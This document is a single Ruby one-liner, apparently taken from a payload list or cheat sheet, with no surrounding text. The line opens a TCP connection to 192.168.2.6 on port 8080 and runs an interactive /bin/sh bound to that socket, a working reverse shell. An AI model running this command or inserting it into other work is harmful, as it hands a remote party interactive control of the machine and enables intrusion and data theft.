ruby -rsocket -e'f=TCPSocket.open("192.168.2.6",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' 
